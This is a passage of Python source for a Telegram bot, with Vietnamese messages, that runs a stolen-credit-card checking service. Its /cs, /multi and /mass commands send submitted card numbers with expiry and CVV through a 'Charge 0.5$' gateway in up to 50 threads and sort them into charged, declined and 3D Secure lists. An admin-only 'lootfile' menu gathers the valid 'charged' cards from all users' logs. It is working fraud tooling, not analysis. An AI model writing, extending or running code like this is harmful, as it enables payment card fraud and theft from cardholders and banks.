        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)

        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " â€“ ".join(bin_info_parts)
        
        response_text = (
            f"ğŸ†” **BIN:** {bin_info_line}\n"
            f"ğŸ›ï¸ **Bank:** {bank}\n"
            f"ğŸŒ **Country:** {country_name} {flag}"
        )

        final_message = f"â„¹ï¸ **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)

    except json.JSONDecodeError:
        await msg.edit_text(f"âŒ Lá»—i khi phÃ¢n tÃ­ch dá»¯ liá»‡u tá»« API cho BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"Lá»—i trong /bin: {e}", exc_info=True)
        await msg.edit_text(f"â›”ï¸ **Lá»—i Há»‡ Thá»‘ng:** `{e}`")


async def cs_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Báº¡n khÃ´ng Ä‘Æ°á»£c phÃ©p sá»­ dá»¥ng lá»‡nh nÃ y. Vui lÃ²ng liÃªn há»‡ Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    if not context.args: await update.message.reply_text("Sá»­ dá»¥ng: `/cs cc|mm|yy|cvv` hoáº·c `/cs cc|mm/yy|cvv`"); return
    
    line = " ".join(context.args)
    msg = await update.message.reply_text("â³ *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(check_card, line)
        duration = time.time() - start_time

        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'

        if is_vn_decline:
            final_message = (f"**ğŸ’  CARD CHECK RESULT ğŸ’ **\n\n"
                             f"**ğŸ’³ Card:** `{original_line}`\n"
                             f"**ğŸš¦ Status: âŒ DECLINED**\n"
                             f"**ğŸ’¬ Response:** `DECLINED`\n\n"
                             f"**ğŸ¦ Gateway:** `Charge 0.5$ Auth Api`\n\n"
                             f"**â±ï¸ Took:** `{duration:.2f}s`\n\n"
                             f"ğŸ‘¤ *Checker by: {ADMIN_USERNAME}*")
        else:
            status_map = {
                'success': ("âœ… CHARGED 0.5$", "Transaction successful!"),
                'decline': ("âŒ DECLINED", "Transaction declined by issuing bank."),
                'custom': ("ğŸ”’ 3D SECURE", "3D Secure authentication required."),
                'invalid_format': ("ğŸ“‹ FORMAT ERROR", full_response),
                'error': ("â—ï¸ ERROR", full_response),
                'unknown': ("â” UNKNOWN", "Could not determine card status."),
            }
            status_text, response_message = status_map.get(status, status_map['unknown'])
            
            # *** FIX Lá»–I NONETYPE ***
            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " â€“ ".join(bin_info_parts)

            bin_details_str = (
                f"ğŸ†” **BIN:** {bin_info_line}\n"
                f"ğŸ›ï¸ **Bank:** {bank}\n"
                f"ğŸŒ **Country:** {country_name} {flag}"
            )
            
            # *** FIX Lá»–I PARSE ENTITIES ***
            # Sá»­ dá»¥ng khá»‘i code (```) cho cÃ¡c pháº£n há»“i cÃ³ thá»ƒ gÃ¢y lá»—i Markdown
            response_display_part = ""
            if status in ['invalid_format', 'error', 'unknown']:
                safe_response = str(response_message)[:1000] # Cáº¯t bá»›t tin nháº¯n lá»—i quÃ¡ dÃ i
                response_display_part = f"**ğŸ’¬ Response:**\n```\n{safe_response}\n```"
            else:
                response_display_part = f"**ğŸ’¬ Response:** `{response_message}`"


            final_message = (f"**ğŸ’  CARD CHECK RESULT ğŸ’ **\n\n"
                             f"**ğŸ’³ Card:** `{original_line}`\n"
                             f"**ğŸš¦ Status: {status_text}**\n"
                             f"{response_display_part}\n\n"
                             f"â„¹ï¸ **BIN Info:**\n{bin_details_str}\n\n"
                             f"**ğŸ¦ Gateway:** `Charge 0.5$ Auth Api`\n\n"
                             f"**â±ï¸ Took:** `{duration:.2f}s`\n\n"
                             f"ğŸ‘¤ *Checker by: {ADMIN_USERNAME}*")
        
        await msg.edit_text(final_message)
        
    except Exception as e:
        logger.error(f"Lá»—i trong /cs: {e}", exc_info=True)
        # Bá»c lá»—i trong khá»‘i code Ä‘á»ƒ trÃ¡nh lá»—i parse entities thá»© cáº¥p
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"â›”ï¸ **System Error:**\n```\n{safe_error_message}\n```")


async def multi_check_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Báº¡n khÃ´ng Ä‘Æ°á»£c phÃ©p sá»­ dá»¥ng lá»‡nh nÃ y. Vui lÃ²ng liÃªn há»‡ Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
        
    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
        await update.message.reply_text("Báº¡n Ä‘ang cÃ³ má»™t tÃ¡c vá»¥ check khÃ¡c Ä‘ang cháº¡y. Vui lÃ²ng chá» nÃ³ hoÃ n thÃ nh.", quote=True)
        return

    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("Sá»­ dá»¥ng: `/multi` vÃ  dÃ¡n danh sÃ¡ch tháº» cá»§a báº¡n á»Ÿ dÃ²ng dÆ°á»›i."); return

    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await update.message.reply_text("KhÃ´ng cÃ³ tháº» nÃ o Ä‘á»ƒ check."); return

    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"â›”ï¸ **VÆ°á»£t quÃ¡ giá»›i háº¡n!**\n\n"
                f"Báº¡n Ä‘Ã£ gá»­i `{total_lines}` tháº», nhÆ°ng giá»›i háº¡n cho lá»‡nh /multi lÃ  `{user_limit}` tháº» má»—i láº§n.\n\n"
                f"Äá»ƒ tÄƒng háº¡n má»©c, vui lÃ²ng liÃªn há»‡ admin {ADMIN_USERNAME}."
            )
            return

    status_message = await update.message.reply_text(f"â³ Äang khá»Ÿi táº¡o... Chuáº©n bá»‹ check `{total_lines}` tháº».")
    start_time = time.time()
    
    try:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.add(user.id)

        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines) 

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    status_icons = {'success': 'âœ…', 'decline': 'âŒ', 'custom': 'ğŸ”’', 'invalid_format': 'ğŸ“‹', 'error': 'â—ï¸', 'unknown': 'â”'}
                    
                    if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
                        result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED`"
                    elif status == 'invalid_format':
                        result_line = f"{status_icons[status]} `{original_line}` | LÃ½ do: {str(full_response)[:50]}" # Truncate to prevent errors
                    else:
                        # Handle potential None values from bin_info
                        bank_str = bin_info.get('bank') or 'N/A'
                        type_str = bin_info.get('type') or 'N/A'
                        brand_str = bin_info.get('brand') or 'N/A'
                        country_str = bin_info.get('country_name') or 'N/A'
                        bin_str = f"{bank_str} - {type_str} - {brand_str} - {country_str}"
                        result_line = f"{status_icons.get(status, 'â”')} `{original_line}` | `{bin_str}`"

                    results[status].append(result_line)
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Lá»—i khi xá»­ lÃ½ future cho tháº» {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"â—ï¸ `{original_line}` | Lá»—i xá»­ lÃ½: {e}")


                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (
                        f"**ğŸš€ Checking in progress...**\n{progress_bar}\n"
                        f"**Progress:** `{processed_count}/{total_lines}`\n\n"
                        f"âœ… **Charged:** `{counts['success']}` | âŒ **Declined:** `{counts['decline']}`\n"
                        f"ğŸ”’ **3D Secure:** `{counts['custom']}` | â” **Errors:** `{counts['error']}`"
                    )
                    try:
                        await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e):
                            logger.warning(f"Lá»—i khi cáº­p nháº­t tiáº¿n trÃ¬nh /multi: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Lá»—i khÃ´ng xÃ¡c Ä‘á»‹nh khi cáº­p nháº­t tiáº¿n trÃ¬nh /multi: {e}")
                    last_update_time = time.time()
        
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)

        final_message = [
            f"**ğŸ“Š Check Complete!**\n",
            f"âœ… **Charged:** `{counts['success']}`",
            f"âŒ **Declined:** `{counts['decline']}`",
            f"ğŸ”’ **3D Secure:** `{counts['custom']}`",
            f"ğŸ“‹ **Invalid Format:** `{counts['invalid_format']}`",
            f"â—ï¸ **Errors:** `{counts['error']}`",
            f"**â±ï¸ Took:** `{duration:.2f}s`\n"
            f"-----------------------------------------"
        ]

        if results['success']: final_message.extend(("\n**âœ… CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**ğŸ”’ 3D SECURE CARDS:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**âŒ DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**ğŸ“‹ INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**â—ï¸ ERRORS:**", *results['error']))

        final_text = "\n".join(final_message)
        
        if len(final_text) > 4096:
            await status_message.edit_text("Káº¿t quáº£ quÃ¡ dÃ i Ä‘á»ƒ hiá»ƒn thá»‹. Sáº½ Ä‘Æ°á»£c gá»­i dÆ°á»›i dáº¡ng file.")
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text)

    except Exception as e:
        logger.error(f"Lá»—i trong /multi: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await status_message.edit_text(f"â›”ï¸ **Lá»—i nghiÃªm trá»ng!**\n```\n{safe_error_message}\n```")
    finally:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.discard(user.id)

async def mass_check_handler(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Báº¡n khÃ´ng Ä‘Æ°á»£c phÃ©p sá»­ dá»¥ng lá»‡nh nÃ y. Vui lÃ²ng liÃªn há»‡ Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    
    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        return 

    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("ğŸ“‚ The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"â›”ï¸ **VÆ°á»£t quÃ¡ giá»›i háº¡n!**\n\n"
                f"Tá»‡p cá»§a báº¡n cÃ³ `{total_lines}` dÃ²ng, nhÆ°ng giá»›i háº¡n cá»§a báº¡n lÃ  `{user_limit}` dÃ²ng.\n\n"
                f"Vui lÃ²ng liÃªn há»‡ admin {ADMIN_USERNAME} Ä‘á»ƒ tÄƒng háº¡n má»©c."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10

    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"âš ï¸ **Giá»›i háº¡n luá»“ng!** ThÃ nh viÃªn chá»‰ Ä‘Æ°á»£c dÃ¹ng tá»‘i Ä‘a {MEMBER_THREAD_LIMIT} luá»“ng. ÄÃ£ tá»± Ä‘á»™ng Ä‘iá»u chá»‰nh.",
                quote=True
            )
    else:
        num_threads = min(requested_threads, 50)

    num_threads = max(1, num_threads)

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    status_message = await update.message.reply_text(f"â³ Khá»Ÿi táº¡o... Chuáº©n bá»‹ check `{total_lines}` tháº» vá»›i `{num_threads}` luá»“ng.")
    start_time = time.time()
    
    try:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.add(user.id)

        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
                        line_to_save = f"{original_line} | DECLINED"
                    elif status == 'invalid_format':
                        line_to_save = f"{original_line} | Reason: {full_response}"
                    else:
                        bank_str = bin_info.get('bank') or 'N/A'
                        type_str = bin_info.get('type') or 'N/A'
                        brand_str = bin_info.get('brand') or 'N/A'
                        country_str = bin_info.get('country_name') or 'N/A'
                        bin_str = f"| {bank_str} - {type_str} - {brand_str} - {country_str}"
                        line_to_save = f"{original_line} {bin_str}"
                    
                    result_lists[status].append(line_to_save)

                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"ğŸ DEBUG ALERT (user {user.id}):\n{debug_info}")
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Lá»—i khi xá»­ lÃ½ future cho tháº» {original_line} trong /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | Lá»—i xá»­ lÃ½: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**ğŸš€ Checking in progress...**\n{progress_bar}\n"
                                   f"**Progress:** `{processed_count}/{total_lines}` | **Threads:** `{num_threads}`\n\n"
                                   f"âœ… **Charged:** `{counts['success']}`\n"
                                   f"âŒ **Declined:** `{counts['decline']}`\n"
                                   f"ğŸ”’ **3D Secure:** `{counts['custom']}`\n"
                                   f"ğŸ“‹ **Invalid Format:** `{counts['invalid_format']}`\n"
                                   f"â” **Errors:** `{counts['error']}`")
                    try: 
                        await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e):
                            logger.warning(f"Lá»—i khi cáº­p nháº­t tiáº¿n trÃ¬nh /mass: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Lá»—i khÃ´ng xÃ¡c Ä‘á»‹nh khi cáº­p nháº­t tiáº¿n trÃ¬nh /mass: {e}")
                    last_update_time = time.time()
        
        duration = time.time() - start_time
        final_summary_text = (
            f"**ğŸ“Š Check Complete!**\n\n"
            f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n\n"
            f"âœ… **Charged:** `{counts['success']}`\n"
            f"âŒ **Declined:** `{counts['decline']}`\n"
            f"ğŸ”’ **3D Secure:** `{counts['custom']}`\n"
            f"ğŸ“‹ **Invalid Format:** `{counts['invalid_format']}`\n"
            f"â” **Errors:** `{counts['error']}`\n\n"
            f"**â±ï¸ Took:** `{duration:.2f}s`"
        )
        
        await status_message.edit_text(final_summary_text)

        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)

        file_map = {
            'success': 'charged.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc:
                    await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f:
                f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc:
                await context.bot.send_document(chat_id=ADMIN_ID, document=doc)

    except Exception as e:
        logger.error(f"Lá»—i trong mass_check: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await status_message.edit_text(f"â›”ï¸ **Lá»—i nghiÃªm trá»ng!**\n```\n{safe_error_message}\n```")
    finally:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.discard(user.id)

# --- CÃC Lá»†NH QUáº¢N LÃ & THÃ”NG BÃO ---
async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("â„¹ï¸ Bot Ä‘Ã£ á»Ÿ tráº¡ng thÃ¡i **Táº¯t** rá»“i.")
        return

    set_bot_status(False)
    await update.message.reply_text("âœ… ÄÃ£ **Táº®T** bot. Báº¯t Ä‘áº§u gá»­i thÃ´ng bÃ¡o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"KhÃ´ng thá»ƒ gá»­i thÃ´ng bÃ¡o táº¯t bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1) 
    
    await update.message.reply_text(f"ğŸ“¢ ThÃ´ng bÃ¡o báº£o trÃ¬ Ä‘Ã£ Ä‘Æ°á»£c gá»­i.\n- ThÃ nh cÃ´ng: {success_count}\n- Tháº¥t báº¡i: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("â„¹ï¸ Bot Ä‘Ã£ á»Ÿ tráº¡ng thÃ¡i **Báº­t** rá»“i.")
        return
    
    set_bot_status(True)
    await update.message.reply_text("âœ… ÄÃ£ **Báº¬T** bot. Báº¯t Ä‘áº§u gá»­i thÃ´ng bÃ¡o...")

    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_on"] if lang == 'vi' else MESSAGES_EN["bot_on"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"KhÃ´ng thá»ƒ gá»­i thÃ´ng bÃ¡o báº­t bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)

    await update.message.reply_text(f"ğŸ“¢ ThÃ´ng bÃ¡o hoáº¡t Ä‘á»™ng Ä‘Ã£ Ä‘Æ°á»£c gá»­i.\n- ThÃ nh cÃ´ng: {success_count}\n- Tháº¥t báº¡i: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if len(context.args) < 2:
        await update.message.reply_text("CÃº phÃ¡p: `/send <user_id> <tin_nháº¯n>`"); return
        
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("âŒ User ID khÃ´ng há»£p lá»‡."); return
        
    message_to_send = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"âœ‰ï¸ **Tin nháº¯n tá»« Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"âœ… Tin nháº¯n Ä‘Ã£ Ä‘Æ°á»£c gá»­i Ä‘áº¿n user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"âŒ Gá»­i tin nháº¯n tháº¥t báº¡i: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text("CÃº phÃ¡p: `/sendall <tin_nháº¯n>`"); return
        
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    
    if not authorized_users:
        await update.message.reply_text("â„¹ï¸ KhÃ´ng cÃ³ thÃ nh viÃªn nÃ o Ä‘á»ƒ gá»­i tin."); return
        
    await update.message.reply_text(f"ğŸ“¢ Báº¯t Ä‘áº§u gá»­i tin nháº¯n Ä‘áº¿n `{len(authorized_users)}` thÃ nh viÃªn...")
    
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"ğŸ“¢ **ThÃ´ng bÃ¡o tá»« Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"KhÃ´ng thá»ƒ gá»­i broadcast Ä‘áº¿n user {user_id}: {e}")
        await asyncio.sleep(0.1)
        
    await update.message.reply_text(f"ğŸ Gá»­i tin nháº¯n hoÃ n táº¥t!\n- ThÃ nh cÃ´ng: `{success_count}`\n- Tháº¥t báº¡i: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("ChÆ°a cÃ³ dá»¯ liá»‡u thá»‘ng kÃª nÃ o."); return
    
    message = "ğŸ“Š **THá»NG KÃŠ CHECK Cá»¦A USER** ğŸ“Š\n\n"
    
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)

        if isinstance(data, dict):
            user_display = f"@{data.get('username')}" if data.get('username') else f"ID: {user_id_str}"
            message += (f"ğŸ‘¤ **{user_display}** (`{user_id_str}`)\n"
                        f"  âœ… Charged: `{data.get('total_charged', 0)}`\n"
                        f"  ğŸ”’ Custom: `{data.get('total_custom', 0)}`\n"
                        f"  âŒ Declined: `{data.get('total_decline', 0)}`\n"
                        f"  â” Lá»—i: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  ğŸ•’ Láº§n cuá»‘i: `{data.get('last_check_timestamp', 'ChÆ°a check')}`\n"
                        f"--------------------\n")
        else:
            message += (f"ğŸ‘¤ **ID: {user_id_str}**\n"
                        f"  *ChÆ°a tá»«ng check hoáº·c dá»¯ liá»‡u lá»—i.*\n"
                        f"--------------------\n")
    
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)

async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("CÃº phÃ¡p: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"KhÃ´ng tÃ¬m tháº¥y lá»‹ch sá»­ check cho user `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. Láº¥y File Charge Gáº§n Nháº¥t", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. Láº¥y Táº¥t Cáº£ File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Chá»n Tá»« Lá»‹ch Sá»­", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Chá»n tÃ¹y chá»n Ä‘á»ƒ láº¥y file cá»§a user `{target_user_id}`:", reply_markup=reply_markup)

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    if command == "setlang":
        lang_code = data[1]
        set_user_lang(user_from_callback.id, lang_code)
        
        # Truyá»n Ä‘á»‘i tÆ°á»£ng `user` vÃ o hÃ m
        help_text = await get_help_text(user_from_callback, lang_code)
        await query.edit_message_text(help_text, disable_web_page_preview=True)
        return

    if user_from_callback.id != ADMIN_ID:
        await query.answer("Báº¡n khÃ´ng cÃ³ quyá»n thá»±c hiá»‡n hÃ nh Ä‘á»™ng nÃ y.", show_alert=True)
        return
        
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None

    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. Láº¥y File Charge Gáº§n Nháº¥t", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. Láº¥y Táº¥t Cáº£ File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Chá»n Tá»« Lá»‹ch Sá»­", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Chá»n tÃ¹y chá»n Ä‘á»ƒ láº¥y file cá»§a user `{target_user_id}`:", reply_markup=reply_markup)

        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"KhÃ´ng cÃ³ lá»‹ch sá»­ check cho user `{target_user_id}`."); return
            
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc:
                    await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"âœ… ÄÃ£ gá»­i file charge gáº§n nháº¥t tá»« session `{latest_session}`.")
            else:
                await query.edit_message_text(f"â„¹ï¸ Láº§n check gáº§n nháº¥t (`{latest_session}`) khÃ´ng cÃ³ tháº» charge nÃ o.")

        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f:
                            all_charged_content.append(f.read())
            
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"âœ… ÄÃ£ gá»­i file tá»•ng há»£p táº¥t cáº£ tháº» charge cá»§a user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"â„¹ï¸ User `{target_user_id}` khÃ´ng cÃ³ tháº» charge nÃ o trong lá»‹ch sá»­.")

        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: 
                        dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S")
                        readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: 
                        readable_ts = session_ts
                    button_text = f"ğŸ•’ {readable_ts} - âœ…{counts.get('success',0)} âŒ{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            
            keyboard.append([InlineKeyboardButton("Â« Quay láº¡i Menu ChÃ­nh", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"ğŸ“œ **Lá»‹ch sá»­ check cá»§a user `{target_user_id}`:**", reply_markup=reply_markup)

        elif action == "session":
